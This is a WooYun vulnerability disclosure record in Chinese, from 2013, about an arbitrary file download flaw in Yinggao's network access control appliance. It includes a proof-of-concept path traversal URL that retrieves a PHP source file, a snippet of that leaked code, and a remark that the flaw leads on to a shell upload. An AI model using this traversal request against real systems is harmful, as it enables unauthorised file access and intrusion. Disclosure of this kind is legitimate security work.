{"id": 65138, "wybug_id": "wooyun-2013-016919", "wybug_title": "盈高入网规范管理系统任意文件下载", "wybug_corp": "盈高科技", "wybug_author": "Slcio", "wybug_date": "2013-07-18 14:06", "wybug_open_date": "2013-10-16 14:07", "wybug_type": "任意文件遍历/下载", "wybug_level": "低", "wybug_rank_0": "12", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当", "硬件安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-18：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-10-16：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 盈高入网规范管理系统 是常见的准入控制设备，其后下载功能存在下载绕过，可以下载任意文件。 详细说明：  该系统的软件下载页面，数据库备份下载页面等所有下载页面存在下载任意文件漏洞。但是找到其真实路径比较困难。不过通过经验猜到框架形式还是很容易获取路径的。如下面地址http://地址/trade.php?tradecode=databack&filename=/../mod/system/set/trade/softset.php由于是在客户内网挖掘，不太记得路径地址印象是这样的，如果厂家可以提供一台设备测试可以精确帮忙定位该漏洞，下面会贴上下载到的代码。\n\n\n\n   漏洞证明：  \n<?php\tif(!defined('IN_ACCESS'))\t\texit('Access Denied!');\tclass TradeSoftSet extends Trade\t{\t\tpublic function processTradecode()\t\t{\t\t\tglobal  $gTemplate,$aCommon,$gAlertScript, $gNavBar,$backfiles, $SMARTY;\t\t\t\t\t\t//导航\t\t\t$gNavBar = array('system_set'=>'系统设置','0'=>'软件管理');\t\t\t\t\t\t$uploaddir = DROOT . \"/download/soft/\";\t\t\tif( !is_dir($uploaddir) )\t\t\t\tmkdir($uploaddir);\n通过下载文件下载到上传文件的程序并找到上传路径并获取上传shell的地址。   修复方案：  由于该设备一个下午黑盒测试出多出漏洞，建议对其安全性进行全面检测。尤其对是代码进行全面审计，确保该类设备的安全。    版权声明：转载请注明来源 Slcio@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}